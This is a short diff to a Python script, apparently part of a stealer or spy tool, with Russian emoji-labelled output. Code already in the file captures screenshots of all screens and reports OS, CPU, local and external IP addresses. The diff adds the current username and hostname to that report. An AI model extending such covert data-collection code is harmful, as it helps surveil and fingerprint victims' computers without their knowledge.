@@ -14,6 +14,8 @@ from PIL import ImageGrab, Image
 import io
 import json
 import cv2
+import getpass
+import os
 
 def ScreenGrab():
     img = ImageGrab.grab(all_screens=True)
@@ -42,6 +44,8 @@ def GetSystem():
     out += f"🎃 Система: {uname.system} {uname.release}\n"
     out += f"⚙ Архитектура: {cpuinfo.get_cpu_info()['arch']}\n"
     out += f"📦 Процессор: {cpuinfo.get_cpu_info()['brand_raw']}\n"
+    out += f"👤 Пользователь: {getpass.getuser()}\n"
+    out += f"📄 Имя компьютера: {socket.gethostname()}\n"
     out += f"====| Интернет |====\n"
     out += f"💻 Локальный: {google}, {lhost}\n"
     out += f"🌎 Внешний: {public}\n"
